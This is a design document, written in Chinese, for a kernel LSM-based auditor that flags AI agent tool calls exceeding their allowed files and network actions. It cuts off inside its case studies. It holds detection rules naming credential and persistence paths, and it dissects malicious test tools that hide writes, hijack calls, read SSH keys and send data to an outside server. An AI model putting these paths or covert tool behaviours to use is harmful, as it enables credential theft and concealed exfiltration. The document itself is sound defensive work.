# LSM Hook 越权分析模块设计文档

版本 2，2026-07-29。对应代码：`lha_realtime/`，规则文件 `lha_realtime/detection_rules.yaml`。

---

## 概述

这个模块判断 agent 的一轮工具调用有没有越权。判断的材料有两份：内核 LSM hook 记录的实际行为，以及用户态 IR 推理出的这一轮允许做什么。

之所以要做这件事，是因为用户态的事实来源只有工具自己。`action_json` 里的入参和返回值都是工具写的，工具想隐瞒什么就能隐瞒什么。语料里的 `safe_file_reader__read_text_audited` 就是例子：它读完文件之后向同一个路径追加一段内容，返回值里一个字都不提。用户态无论怎么审计自己的记录，都看不到这次写入。

内核侧不依赖工具的自述。进程碰过哪个 inode、用什么 flags 打开、往哪个套接字发了包，这些在 LSM hook 里都有记录，跟工具怎么描述自己无关。

只有内核数据还不够。内核能告诉你"这个进程读了 `/tmp/hello.txt`"，没法告诉你这次读取该不该发生。判定需要一条基线，而 agent 场景恰好有一条通用运行时安全工具拿不到的基线：每一轮调用都有一份 IR 允许集，写明了这一轮被授权碰哪些文件、做哪些动作、连哪些网络。

所以判定分三层：

1. **意图层**：路径有没有落在这一轮的 IR 允许集里，动作有没有超出该路径声明的动作集合。
2. **资源层**：这条路径本身是不是凭据、私钥、进程内存、审计日志这类读到就有实质损害的资源。判定依据来自 ATT&CK、Falco、Neo23x0 auditd、CIS 这些公开规则集，逐条可追。
3. **交叉层**：内核侧的 `resource_role` 作为第二条独立判据，跟 IR 判据做交叉，分歧数在报告头部单列。

三层的取舍、每一条敏感路径的出处、以及九类异常工具的真实样例，是本文的主体。第 11 章对比了这套做法跟纯用户态审计、通用运行时安全的差别，第 12 章列了已知局限。

---

## 1. 模块要解决的问题

Agent 调用工具时，用户态能拿到的只有工具自己交代的东西：`action_json` 里记录的入参、返回值，以及 IR 推理出来的允许集。工具在返回值里隐瞒的动作，用户态没有任何办法看见。

内核 LSM hook 记录的是进程实际触碰过的每一个文件和每一个套接字，跟工具怎么描述自己无关。一个工具声称"只读 `/tmp/hello.txt`"，如果它在读完之后又以 `O_APPEND` 打开同一个文件写了一段内容，`file_open` 事件里的 flags 会把这件事记下来。

本模块消费内核侧的 LSM 事件和 syscall 序列，跟用户态的 IR 允许集做比对，产出一份带判定依据的 Markdown 报告，并把报告路径回传给后端。

---

## 2. 输入

### 2.1 四类推送消息

上游监控服务通过 Socket.IO 推送，到达顺序不固定。服务等四类全部收齐才启动分析，避免报告内容残缺。

| push_type | 承载内容 | 落盘文件 |
|---|---|---|
| `round_start` | round 开始时间、会话标识 | `round_start.json` |
| `round_end` | round 结束时间、`action_json`（用户态实际记录的工具调用） | `round_end.json` |
| `round_kernel` | 两个内核 JSONL 的绝对路径、`kernel_resource_facts` | `round_kernel.json` + 拷贝两个 JSONL |
| `round_ir_ready` | `ir_json`（用户态推理出的允许集） | `ir.json` |

`round_ir_ready` 是较新的上游行为。旧上游把 `ir_json` 塞在 `round_end` 里，`load_ir_source()` 会先找 `ir.json`，找不到再回退读 `round_end.json` 的 `ir_json` 字段。

### 2.2 `round_start.json`

```json
{
  "push_type": "round_start",
  "round_id": "6bc22d91",
  "time_start": "2026-07-08 10:31:24.516+0800",
  "session_key": "agent:main:main",
  "push_time": "2026-07-08 10:31:24.516+0800"
}
```

### 2.3 `round_end.json`

`action_json` 是一个 JSON 字符串，解开是工具调用数组。这是用户态视角的全部事实。

```json
{
  "push_type": "round_end",
  "round_id": "6bc22d91",
  "time_end": "2026-07-08 10:32:16.444+0800",
  "action_json": "[{\"tool\": \"cmd_executor__exec_script\", \"arguments\": {\"command\": \"/home/hx/jjq/agent_perm_audit/scripts/bash/hello.sh\"}, \"resources\": [], \"result\": \"{\\\"exit_code\\\": 0, \\\"stdout\\\": ...}\"}]",
  "push_time": "2026-07-08 10:32:16.444+0800"
}
```

### 2.4 `round_kernel.json`

两个 JSONL 只给路径，pipeline 负责拷贝到 `input/<round_id>/` 下。

```json
{
  "push_type": "round_kernel",
  "round_id": "6bc22d91",
  "kernel_syscall_seq": "/home/hx/jjq/clawAVC/infos/kernel_infos/6bc22d91/6bc22d91_syscall_seq.jsonl",
  "kernel_lsm_hook_result": "/home/hx/jjq/clawAVC/infos/kernel_infos/6bc22d91/6bc22d91_lsm_hook_result.jsonl",
  "kernel_resource_facts": "{\"round_id\": \"6bc22d91\", \"tool_call_count\": 1, \"tool_calls\": [...]}",
  "push_time": "2026-07-08 10:31:28.089+0800"
}
```

### 2.5 `ir.json`：用户态允许集

`ir_json` 内部是两级结构。`level1` 是场景标签，`level2.policies` 是逐条策略。模块只消费 `effect == "allow"` 的策略，把 `objects` 按 `type` 拆成三类。

```json
{
  "level1": ["shell_exec"],
  "level2": {
    "policies": [{
      "subject": "shell_exec",
      "effect": "allow",
      "objects": [
        {"type": "tool", "identifier": "cmd_executor__exec_script",
         "actions": ["invoke"],
         "params": [{"name": "script_path",
                     "identifier": "/home/hx/jjq/agent_perm_audit/scripts/bash/hello.sh"}]},
        {"type": "file", "identifier": "/home/hx/jjq/agent_perm_audit/scripts/bash/hello.sh",
         "actions": ["read"]}
      ]
    }]
  },
  "meta": {"level1": {"model": "deepseek-v4-flash", "latency_ms": 1755, "endpoint": "..."}}
}
```

`parse_allowlist()` 把它展开成：

```python
{
  "files": {"/home/hx/jjq/agent_perm_audit/scripts/bash/hello.sh"},
  "file_actions": {"/home/hx/jjq/agent_perm_audit/scripts/bash/hello.sh": ["read"]},
  "tools": {"exec", "cmd_executor__exec_script"},
  "networks": set(),
  "network_actions": set(),
}
```

`file` 的 `identifier` 可以是精确路径、glob（`/workspace/**/*.txt`）或正则（`^/tmp/[a-z]+\.txt$`）。IR 不标注模式类型，`is_regex_pattern()` 靠 `^ $ + | ( ) { } \ .*` 这些字符做推断，含 `* ? [` 的按 glob 处理，两者都不像就当精确路径。glob 语义里 `*` 不跨路径分隔符，`**` 跨目录。

### 2.6 `kernel_lsm_hook_result.jsonl`：LSM 事件

一行一个事件。文件类 hook 带 `path`，网络类 hook（`socket_*`）不带。

```json
{
  "round_id": "6bc22d91",
  "tool_call_id": "call_9fbe43e25bb3469e9a41a626",
  "tool_name": "cmd_executor__exec_script",
  "session_key": "agent:main:dashboard:b1699c53-ecca-4358-ba11-90acc4628abb",
  "kind": "lsm_check",
  "event_id": "alpha1_evt_41966",
  "related_event_id": "tracee_evt_120573",
  "timestamp_mono_ns": 651129337787924,
  "pid": 761774, "tid": 761774,
  "path": "/root/.ssh/id_ed25519",
  "category": "privacy",
  "resource_role": "privacy_resource",
  "hook_name": "file_open",
  "result": "allow",
  "return_value": 0,
  "args": {
    "flags": "O_RDONLY|O_LARGEFILE",
    "pathname": "/root/.ssh/id_ed25519",
    "syscall_pathname": "/root/.ssh/id_ed25519",
    "inode": 9815302, "dev": 22
  }
}
```

模块用到的字段：

| 字段 | 用途 |
|---|---|
| `path` | 分类与越权比对的主键 |
| `args.flags` | 映射成动作词汇。`O_CREAT` 出 `create`，`O_WRONLY`/`O_RDWR`/`O_TRUNC` 出 `write`，`O_RDONLY`/`O_RDWR` 出 `read` |
| `args.syscall_pathname` | 系统调用原始路径。`/proc/self/*` 会在这里保留原样，`path` 已经解析成 `/proc/<pid>/*` |
| `hook_name` | `file_open` 走 flags；`inode_unlink`/`inode_rmdir` 直接出 `delete`；`socket_*` 走网络判定 |
| `resource_role` | 内核侧独立判据。`privacy_resource` 表示内核认为这是隐私资源 |
| `pid` | 判断 `/proc/<pid>/` 是不是进程读自己 |
| `related_event_id` | 关联到 syscall 序列，用于拿读写字节数 |
| `result` | `allow` 表示内核放行。模块分析的是"内核放行了但用户态不允许"的操作 |

### 2.7 `kernel_syscall_seq.jsonl`：系统调用序列

```json
{
  "round_id": "6bc22d91",
  "tool_name": "cmd_executor__exec_script",
  "kind": "syscall",
  "action": "newfstatat",
  "syscall": "newfstatat",
  "event_id": "tracee_evt_120572_enter",
  "timestamp_mono_ns": 1783477885048857567,
  "pid": 761774,
  "path": "/usr/lib64/python3.9/encodings",
  "result": "success",
  "return_value": 0,
  "requested_bytes": null,
  "returned_bytes": null,
  "args": {"dirfd": -100, "flags": 0, "pathname": "/usr/lib64/python3.9/encodings"}
}
```

`action` 为 `open`/`read`/`write`/`connect` 的记录参与归属计算。`connect` 的 `args.remote_ip` 和 `args.remote_port` 用来给后续的 `send`/`recv` 标注目标端点。

---

## 3. 输出

`input/<round_id>/` 下三个产物。

### 3.1 `analysis_report.md`

给人看的报告，也是回传给后端的东西。结构固定：

```
# 越权分析报告 — round `<id>`

## 判定结论
  是否异常 / 异常类型（含判定理由与规则依据）
  报告生成时间 / 会话 / round 时间段 / 工具 / 用户态判定得分
  内核事件计数 / 越权操作数 / 判据分歧数

## 用户态允许集 (ir_json)
## 用户态实际记录行为 (action_json)
## 越权清单（内核 LSM 放行，但用户态不允许）
   ### 文件   按 敏感资源 / 其他 / 运行时加载 / 未知路径 四类分表
   ### 网络   按 数据收发 / 连接管理 / 其他 分组
## 内核 resource_facts
```

敏感段落长这样（取自 round `2d93d23b` 的真实输出）：

```markdown
- 异常类型:
  - 访问危险文件（敏感越权）:
    - [critical] SSH 与私钥材料，ATT&CK T1552.004/T1098.004/T1563.001/T1018 — 命中 10 个路径
      - `/root/.ssh/id_ed25519`（read）
      - `/root/.ssh/authorized_keys`（read）
      ...
      判定理由: 私钥/授权公钥/已知主机清单，读到即可冒充身份横向移动，known_hosts 还会直接暴露可达的内网目标
      规则依据: ATT&CK T1552.004 正文点名 ~/.ssh；Neo23x0 auditd -w /root/.ssh -k rootkey 与 -w /etc/ssh/ -k sshd
```

越权清单里的敏感表格额外带一列判定依据：

```markdown
| path | 敏感依据 | hook | 动作 | 次数 | 读取字节 | 判据一致 |
|---|---|---|---|---|---|---|
| `/root/.ssh/id_ed25519` | SSH 与私钥材料（critical，ATT&CK T1552.004/...） | file_open | read | 1 | 0 | yes |
```

"判据一致"这一列记录两个独立判据是否给出相同结论。`yes` 表示 IR 允许集和内核 `resource_role` 都认定越权，`no` 表示只有其中一个命中。

### 3.2 `analysis_violations.jsonl`

机器消费的明细，一行一条越权记录，字段是内核事件字段加上分析结果：

```
round_id, event_id, hook_name, result, return_value, pid, tid, timestamp_mono_ns,
path, syscall_pathname, fd, resource_role, tool_call_id, tool_name, related_event_id,
syscall, syscall_result, syscall_return_value, requested_bytes,
read_bytes, read_count, write_bytes, write_count, observed_actions,
is_network, net_detail, kernel_category, category,
sensitive_rule, sensitive_title, sensitive_severity, sensitive_attck,
sensitive_reason, sensitive_basis,
by_ir_json, by_resource_role, judges_agree
```

`category` 是模块判定的四值分类（`sensitive` / `runtime` / `other` / `unknown`）。命中敏感分组时才有 `sensitive_*` 六个字段。

### 3.3 `analysis_kernel_report_push.json`

上报 marker，同时是幂等标记。存在即表示这一代分析已经上报过。

```json
{
  "round_id": "6bc22d91",
  "judge_result_kernel_md_path": "/home/hx/try/lsm-hook-analysis-realtime/input/6bc22d91/analysis_report.md",
  "endpoint": "http://8.152.192.7:15100/api/rounds/detection/kernel",
  "response": {"code": 0, "msg": "ok"}
}
```

---

## 4. 处理链路

```
Socket.IO push
  → SQLite inbox（只存消息状态、round 状态、任务状态、文件路径）
  → input/<round_id>/ 落盘（真实输入输出都在这里）
  → 四类消息齐 → 入分析队列
  → analyze_round()
  → write_outputs()：analysis_report.md + analysis_violations.jsonl
  → POST 上报报告路径 → 写 marker
```

同一个 `round_id` 再次到达时按新 round 处理：取消旧的未完成任务、清理旧的输入与产物、重新等四类消息。`generation` 字段用来区分代次，避免旧任务写坏新一代的产物。

---

## 5. 判定模型

### 5.1 文件操作提取

以 LSM `file_open` 事件为主线。每个 hook 通过 `related_event_id` 找到对应的 syscall，拿到 open 返回的 fd，再用 `(pid, fd)` 去 syscall 序列里匹配后续的 read/write，累加字节数。

fd 会被复用，所以匹配时限定时间窗：从本次 open 的时间戳开始，到同一个 `(pid, fd)` 的下一次 open 为止。

### 5.2 动作词汇

内核观测到的动作要跟 IR 的动作词汇对齐才能比对。

| 来源 | 映射 |
|---|---|
| `O_CREAT` | `create` |
| `O_WRONLY` / `O_RDWR` / `O_TRUNC` | `write` |
| `O_RDONLY` / `O_RDWR` | `read` |
| `inode_unlink` / `inode_rmdir` | `delete` |
| 实际发生 read syscall | `read` |
| 实际发生 write syscall | `write` |
| `socket_sendmsg` | `send` |
| `socket_recvmsg` | `receive` |

flags 缺失且没有任何 syscall 佐证时兜底为 `read`。

### 5.3 两条独立判据

对同一次操作，两个判据各自给结论：

- **判据 A（`by_ir_json`）**：路径没有命中 IR 允许集里的任何 identifier，判为越权。
- **判据 B（`by_resource_role`）**：内核事件的 `resource_role` 等于 `privacy_resource`，判为越权。

任一命中就进越权清单，`judges_agree` 记录两者是否一致。分歧数在报告头部单列，方便评审时看两条判据的耦合程度。

### 5.4 三类异常

| 异常类型 | 触发条件 |
|---|---|
| 访问危险文件（敏感越权） | 越权清单里存在 `category == "sensitive"` 的记录 |
| 文件访问出现未授权动作 | 路径命中了 IR 允许集，但实际动作超出该 identifier 声明的动作集合 |
| 网络访问出现未授权动作 | 观测到的网络动作超出 IR 声明的 `network_actions` |

网络这条有一个抑制规则：工具去平台拉线上配置走的是本地回环。当一个 round 里所有可识别端点都落在 `network.ignored_endpoints` 里，整轮网络视为正常。只要出现一个其他端点（比如 `8.152.192.7:15100`），抑制立即失效，全部网络动作照常判定。

---

## 6. 敏感资源判定：文献调研

敏感路径不能靠拍脑袋列表。判定要经得起追问"为什么这条算敏感"，所以每一组路径都绑定一个公开可查的来源。

### 6.1 调研过的来源

| 来源 | 具体取到了什么 |
|---|---|
| **MITRE ATT&CK Enterprise** | T1003.008 指出 `/etc/shadow` 默认仅 root 可读，adversary 需要同时拿到 `/etc/passwd` 才能 unshadow；T1552.001 正文点名 `~/.aws/credentials`、`application_default_credentials.json`、`azureProfile.json`、`.npmrc`、`~/.netrc`、`/run/secrets`、`/mnt/config`；T1552.004 点名 `~/.ssh` 与 `.key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc` 一组扩展名；T1552.003 单独刻画 bash history；T1003.007 刻画 proc 文件系统凭据转储；T1070.002 刻画清 Linux 日志；T1611 刻画容器逃逸到宿主 |
| **Falco 默认规则集**（falcosecurity/rules，`rules/falco_rules.yaml`） | `list sensitive_file_names` 只有四条：`/etc/shadow`、`/etc/sudoers`、`/etc/pam.conf`、`/etc/security/pwquality.conf`；`macro sensitive_files` 额外覆盖 `fd.directory in (/etc/sudoers.d, /etc/pam.d)`；`rule "Search Private Keys or Passwords"` 覆盖 `id_rsa`/`id_dsa`/`id_ecdsa`/`id_ed25519` 与 `BEGIN PRIVATE`、`BEGIN OPENSSH PRIVATE` 关键字；`Write below binary dir` 覆盖二进制目录写入 |
| **Neo23x0/auditd**（Linux auditd 最佳实践基线） | 按 key 分组的 `-w` 监控清单，本模块的分组结构基本沿用了它的切分方式：`etcpasswd`、`etcgroup`、`pam`、`actions`（sudoers）、`rootkey`（`/root/.ssh`）、`sshd`（`/etc/ssh/`）、`auditlog`（`/var/log/audit/`）、`session`（`wtmp`/`btmp`/`utmp`）、`systemwide_preloads`（`/etc/ld.so.preload`）、`cron`、`systemd`、`init`、`modprobe`、`shell_profiles`、`mac_policy`、`network_modifications` |
| **CIS Linux Benchmark 6.1.x** | `/etc/shadow`、`/etc/shadow-`、`/etc/gshadow`、`/etc/gshadow-` 应为 0640 root:root/shadow。这条给出的不是路径清单，而是判定的正当性：这些文件在设计上就不该被普通进程读到，读到本身就是证据。同时提醒了备份文件 `/etc/shadow-` 这一类常被漏掉的路径 |
| **Aqua Tracee signatures** | `ld_preload` signature 把对 `/etc/ld.so.preload` 的写入与改名判为代码注入信号，这是把它归入"写才敏感"而不是"读就敏感"的直接依据 |
| **Kubernetes 官方文档** | ServiceAccount 令牌默认投射到 `/var/run/secrets/kubernetes.io/serviceaccount/`，目录下有 `token`、`ca.crt`、`namespace` |
| **容器逃逸公开分析** | `/var/run/docker.sock` 等价于宿主 root；cgroup `release_agent` 在 cgroup 变空时以宿主内核身份执行指定程序；`/proc/sys/kernel/core_pattern` 可触发宿主侧命令执行 |

### 6.2 十三个敏感分组

每组在 `detection_rules.yaml` 里带 `reason`（威胁语义）、`basis`（公开依据）、`attck`（技术编号）、`severity`、`match`（读就敏感还是写才敏感）。

| 分组 | match | severity | 覆盖 |
|---|---|---|---|
| `credential_store` | any | critical | `/etc/shadow(-)`、`/etc/gshadow(-)`、`/etc/sudoers(.d)`、`/etc/pam.d`、`/etc/pam.conf`、`/etc/security/opasswd`、`pwquality.conf` |
| `private_keys` | any | critical | `/root/.ssh`、`/home/*/.ssh/**`、`/etc/ssh/ssh_host_*`、`**/id_rsa`、`**/id_ed25519`、`**/authorized_keys`、`**/*.p12`、`**/*.pfx` |
| `cloud_and_registry_credentials` | any | critical | `.aws`、`.azure`、`.config/gcloud`、`.kube/config`、`.docker/config.json`、`.netrc`、`.npmrc`、`.pypirc`、`.git-credentials`、`.gnupg`、`/run/secrets`、`/var/run/secrets`、`/mnt/config`、`/etc/krb5.keytab`、`/var/lib/sss/secrets`、`**/.env` |
| `shell_history_and_env` | any | high | `**/.bash_history`、`.zsh_history`、`.mysql_history`、`.psql_history`、`.python_history`、`/etc/environment` |
| `process_and_kernel_memory` | any | critical | `/proc/*/environ|mem|maps|smaps|pagemap|stack|syscall|cmdline|fd|cwd|root|exe`、`/proc/kcore`、`/proc/kallsyms`、`/dev/mem`、`/dev/kmem`、`/dev/port` |
| `audit_and_auth_logs` | any | high | `/var/log/audit`、`/etc/audit`、`/var/log/secure`、`/var/log/auth.log`、`wtmp`、`btmp`、`lastlog`、`utmp`、`/var/log/journal`、`/run/log/journal`、`/var/log/sudo-io` |
| `container_escape_surface` | any | critical | `docker.sock`、`containerd.sock`、`crio.sock`、`podman.sock`、`/var/lib/kubelet`、`/sys/kernel/security`、`**/release_agent`、`**/notify_on_release` |
| `account_database_write` | write_only | critical | `/etc/passwd`、`/etc/group`、`/etc/nsswitch.conf`、`/etc/login.defs`、`/etc/subuid`、`/etc/subgid` |
| `preload_and_loader_hijack` | write_only | critical | `/etc/ld.so.preload`、`/etc/ld.so.conf(.d)` |
| `scheduled_task_persistence` | write_only | high | `/etc/crontab`、`/etc/anacrontab`、`/etc/cron.*`、`/var/spool/cron`、`/var/spool/at`、`at.allow`、`at.deny` |
| `service_and_boot_persistence` | write_only | high | `/etc/systemd`、`systemd/system`、`/etc/init.d`、`/etc/rc.local`、`/etc/rc.d`、`/etc/modprobe.d`、`/etc/modules-load.d`、`/boot/` |
| `shell_profile_persistence` | write_only | high | `/etc/profile(.d)`、`/etc/bashrc`、`/etc/shells`、`/etc/csh.*`、`/root/.bashrc`、`/home/*/.bashrc` 等 |
| `binary_directory_write` | write_only | critical | `/bin`、`/sbin`、`/usr/bin`、`/usr/sbin`、`/usr/local/bin`、`/lib`、`/lib64`、`/usr/lib`、`/usr/lib64`、`/usr/libexec` |
| `mac_policy_write` | write_only | high | `/etc/selinux`、`/etc/apparmor(.d)` |
| `name_resolution_hijack` | write_only | high | `/etc/hosts`、`/etc/resolv.conf`、`/etc/ssl/certs`、`/etc/pki/ca-trust` |

### 6.3 三个判定机制

**读写区分（`match: write_only`）。** 持久化面的路径读取是系统常规行为。bash 每次启动都读 `/etc/profile.d`，glibc 每轮 NSS 解析都读 `/etc/passwd`，每次 exec 都要查 `/etc/ld.so.preload`。这些路径按路径一刀切必然产生系统性误报，但写入它们又确实是攻击落地手段。所以这类分组只在实际观测到 `write`/`create`/`delete` 时才成立。

**`/proc` 自读降级（`proc_self_is_runtime`）。** 事件里的 `path` 已经把 `/proc/self/` 解析成了 `/proc/<pid>/`，所以光看路径分不出"读自己"和"读别人"。判定时比较路径里的 pid 与事件的 `pid` 字段，相等则判 runtime；`args.syscall_pathname` 以 `/proc/self/` 开头也判 runtime。

**凭据穿透（`override_runtime`）。** `/root/.openclaw` 整棵树归 openclaw 运行时。但如果密钥文件正好落在这棵树里，仍然要报出来。标了 `override_runtime` 的三个分组（私钥、云凭据、历史与环境变量）排在运行时白名单之前判定。回放时这条规则实际捞到过 `/root/clashctl/.env`。

分类优先级：

```
override_runtime 分组 → openclaw 运行时 → 其余敏感分组 → runtime 前缀 → other
```

---

## 7. 取舍记录

以下每条都在规则文件里留了注释。列在这里是为了让评审能一次看完，不用翻 YAML。

### 7.1 被真实数据证伪的三条旧规则

**`/root/.openclaw` 整体判敏感 + 手工挖白名单。** 旧规则把 `/root/.openclaw` 列为敏感前缀，再逐个把 `extensions`、`agents`、`workspace`、`logs` 挖成白名单。454 个 round 回放下来，2070 次敏感命中里有 1901 次（92%）是框架自身文件：`sandbox`、`sandboxes`、`skills`、`state`、`identity`、`canvas`、`devices`、`plugin-skills` 这些二级目录都没在白名单里。`.openclaw` 下一共 28 个二级目录，全部是框架运行时，白名单永远追不上版本迭代。现在整棵树归运行时，靠 `override_runtime` 分组捞回其中的凭据文件。

**`/proc/*/environ` 与 `/proc/*/maps` 整体判敏感。** 回放中这两类共命中 28 次，`args.syscall_pathname` 全部是 `/proc/self/environ` 和 `/proc/self/maps`。进程读自己的环境变量和内存映射是 glibc、Node、shell 的常规行为，不跨越任何权限边界。报告里写"敏感越权：`/proc/581739/environ`"，评审只要一问"这个 pid 是谁"就站不住。

**`/etc/passwd` 与 `/etc/group` 判敏感。** 两者都是 0644 世界可读，回放中分别被读了 361 次和 100 次，几乎每轮都有。真正含口令散列的是 `/etc/shadow` 和 `/etc/gshadow`。现在改成写才敏感，写入等价于新增后门账号。

### 7.2 明确不收的路径

**`/proc/*/stat` 与 `/proc/*/status`。** 即便跨进程也不收。它们是公开可读的进程元信息，`ps`、`top`、`pgrep` 正常读取，回放中各有 221 次跨进程读。收进来会把敏感段落淹掉，让真正的私钥泄露被埋在噪声里。

**按扩展名匹配 `*.pem` 和 `*.crt`。** ATT&CK T1552.004 确实列了 `.pem` 这组扩展名，但回放中出现了 `/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem`，那是公开的 CA 证书包。按扩展名匹配会把公钥证书误判成私钥材料。改为只收 `.p12` 和 `.pfx` 这类几乎只用于装私钥的容器格式。

**整个 `/home/*` 当跨用户隐私。** 回放中 `/home/hx/jjq/clawAVC/**` 和 `/home/hx/hzx/agent_perm_audit/**` 有大量正常访问，那是审计系统自己的源码与测试脚本。只收 `/home/*/.ssh/**`、`/home/*/.aws/**` 这类凭据子路径。

**`/etc/security` 整个目录。** Neo23x0 监控整个目录，但 `/etc/security/limits.conf` 会在 PAM 建会话时被正常读取。收紧到 `opasswd` 和 `pwquality.conf` 两个具体文件。

### 7.3 前缀匹配的边界处理

前缀匹配用 `str.startswith`，会有连带命中。有的是想要的，有的是误伤，分别处理：

| 前缀 | 连带命中 | 处理 |
|---|---|---|
| `/etc/shadow` | `/etc/shadow-` | 保留，CIS 6.1.x 点名了备份文件 |
| `/etc/sudoers` | `/etc/sudoers.d/*` | 保留，Falco 宏显式包含 |
| `/etc/cron.` | `cron.d`、`cron.daily`、`cron.allow` 等 | 保留，正是想覆盖的一组 |
| `/etc/profile` | `/etc/profile.d/*` | 保留 |
| `/var/log/secure` | `/var/log/secure-20260101` | 保留，轮转日志同样敏感 |
| `/etc/environment` | `/etc/environment-modules/*` | **改掉**。Environment Modules 是环境变量模块管理器的配置目录，跟密钥无关，回放中实测误报 3 次。改用精确 glob |
| `/boot` | `/bootstrap.sh` | **改掉**。前缀改成 `/boot/`，目录本身用 glob `/boot` 单列 |

### 7.4 severity 的定位

`severity` 只影响报告呈现和排序，不参与是否判为异常的决策。分级是给人看的，不是给判定逻辑用的。这样做的原因是内核侧看不到"读了多少内容"这种能支撑分级的上下文，硬把 severity 接进判定会引入一层无法验证的假设。

---

## 8. 样例剖析

以下每个样例都取自真实 round。选取标准是同一件事在用户态看不出问题，在内核侧留下了痕迹。

### 8.1 `safe_file_reader__read_text_audited`：表面 read，实际 write + read

声称的行为是读文本。实际会在读完之后向同一个 path 追加一段固定文本，只在路径以 `.txt` 结尾时触发，返回值里完全不体现这个动作。

**round `8c6f188e`**

| 视角 | 看到的内容 |
|---|---|
| IR 允许集 | `/workspace/**/*.txt`，动作只有 `read` |
| 用户态 `action_json` | `safe_file_reader__read_text_audited {"path": "/tmp/openclaw-lsm-sidecar-test.txt"}` |
| 用户态返回值 | 正常的文件内容，无任何写入痕迹 |
| 内核 LSM | 事件 `tracee_evt_166832`，`file_open` 于 `/tmp/openclaw-lsm-sidecar-test.txt`，flags `O_WRONLY\|O_CREAT\|O_APPEND\|O_LARGEFILE` |

`O_APPEND` 这一位在用户态任何地方都不出现。模块把它映射成 `create` + `write`，跟 IR 声明的 `read` 一比对就落进"文件访问出现未授权动作"。同一个 round 里 `/tmp/perm_audit_sandbox/audit.log` 也被以 `O_WRONLY|O_CREAT|O_APPEND` 打开，那是这一族工具共用的隐蔽落盘位置，全语料 357 次追加写。

同族的 round `be5c6a84` 更直接：工具声称读 `/tmp/helloworld.txt`，内核记录到它读了 8 次 `/var/log/secure`。两条判据都判越权（`by_ir_json` 与 `by_resource_role` 同时为真），命中 `audit_and_auth_logs` 分组。

### 8.2 `safe_file_reader__read_directory`：无论输入什么 path 都优先读指定文件

**round `c9eb1ad8`**

| 视角 | 看到的内容 |
|---|---|
| IR 允许集 | `/workspace/project/report`，动作 `read` |
| 用户态 `action_json` | `safe_file_reader__read_directory {"directory": "project/report"}` |
| 内核 LSM | `/tmp/perm_audit_sandbox/audit.log`，`create` + `write` |

请求的目录和实际触碰的文件完全不在一个位置。用户态只能看到入参 `project/report` 和一份看起来正常的目录列表，路径替换发生在工具内部。内核侧记录的是 `openat` 真正落在了哪个 inode 上。

### 8.3 工具劫持：声明工具 A，实际跑工具 B

LSM 事件自带 `tool_name`，是内核侧在事件发生时打的标签。把它跟 `action_json` 里声明的工具名做差集，劫持就直接暴露了。

| round | 用户态声明 | 内核观测到的额外工具 |
|---|---|---|
| `6cc866d4` | `cmd_executor__exec_script` | `cmd_executor__exec_command` |
| `e71e95be` | `cmd_executor__exec_script` | `cmd_executor__exec_command` |
| `b44671f8` | `cmd_executor__exec_then_hook` | `cmd_executor__exec_script` |
| `326112c3` | `cmd_executor__exec_with_audit` | `cmd_executor__exec_with_cache` |
| `2b6a4000` | `web_fetch`、`web_search` | `http_fetch__get` |

以 `326112c3` 为例，用户态两次调用都记的是 `exec_with_audit {"command": "ls -l"}`，内核事件里却出现了 `exec_with_cache` 的标签，并且这个标签下的操作是对 `/root/.aws` 的 `O_WRONLY|O_CREAT|O_TRUNC` 打开。同一个 round 里还读了 `/root/.ssh/known_hosts`，命中 `private_keys` 分组。

### 8.4 `sys_probe__run_probe`：固定顺序的 syscall 指纹

这个工具每次调用都按固定顺序触发一段真实系统调用序列。它的价值在于给 syscall 序列匹配提供一个稳定样本。

**round `72f5db98`**

| 视角 | 看到的内容 |
|---|---|
| IR 允许集 | 空 |
| 用户态 `action_json` | `sys_probe__run_probe {}`，无参数，返回值看不出做了什么 |
| 内核 syscall | 该工具名下 865 条记录，分布为 `write` 719 次、`read` 91 次、`open` 55 次 |
| 内核 LSM | `/home/hx/hzx/agent_perm_audit/tools/sys_probe/rule_test_atk.json` 读取 192642 字节；`/tmp/perm_audit_sandbox/audit.log` 写入 550 字节 |

一个无参数、无返回内容的工具调用，在内核侧留下了 865 条 syscall 和 19 万字节的文件读取。用户态没有任何字段能表达这件事。

### 8.5 `cmd_executor__exec_command`：把命令输出发给攻击服务器

**round `bbea8339`**

| 视角 | 看到的内容 |
|---|---|
| IR 允许集 | 文件 `/workspace/project/report/summary.txt` 动作 `read`；网络动作集合为空 |
| 用户态 `action_json` | `cmd_executor__exec_command {"command": "head -n 5 /workspace/project/report/summary.txt"}` |
| 用户态返回值 | 文件前 5 行，符合预期 |
| 内核 LSM | `socket_sendmsg` 与 `socket_recvmsg`，端点 `8.152.192.7:15100` |

IR 一条网络动作都没允许，命令本身也不含任何网络语义，`head` 不会发包。回环抑制规则在这里不生效，因为端点不是 `127.0.0.1:15100`。判为"网络访问出现未授权动作"。

同族的 `4bb57384`（`wc -l test/a.txt`）、`73111204`（`wc -l /tmp/hello.txt && tail -n 3 /tmp/hello.txt`）、`513c081b`（`touch` 一个文件）都是同一模式：命令完全本地，内核侧全部出现到 `8.152.192.7:15100` 的收发。

### 8.6 `cmd_executor__exec_then_hook`：命令之后执行一段隐藏命令

**round `b117d7c4`**

| 视角 | 看到的内容 |
|---|---|
| IR 允许集 | 空 |
| 用户态 `action_json` | `cmd_executor__exec_then_hook {"command": "printf openclaw_query16 \| wc -c"}` |
| 用户态返回值 | 一个数字。命令只是算字符串长度，不碰文件也不碰网络 |
| 内核 LSM | `socket_sendmsg` / `socket_recvmsg` 到 `8.152.192.7:15100`；`/tmp/perm_audit_sandbox/audit.log` 三次 `create` + `write` |

`printf | wc -c` 是纯计算，理论上不该产生任何套接字。隐藏命令的全部痕迹只存在于内核侧。

`2111fbc4` 是同族里信息量更大的一个：用户态记录 `exec_then_hook {"command": "pwd"}` 加 `exec_with_cache {"command": "cat /root/.ssh/id_rsa"}`，IR 只允许读 `/root/.ssh/id_rsa`，内核侧则记录到对 `/root/.aws` 的 `O_WRONLY|O_CREAT|O_TRUNC` 写入，并且出现到 `8.152.192.7:15100` 的收发。

### 8.7 `cmd_executor__exec_script`：调用被劫持到另一个脚本

**round `d4bcd2b8`**，这个样例的落差最大。

| 视角 | 看到的内容 |
|---|---|
| IR 允许集 | 空，一个文件都没允许 |
| 用户态 `action_json` | `cmd_executor__exec_script {"command": "printf openclaw_query17 \| wc -c"}` |
| 用户态返回值 | 一个数字 |
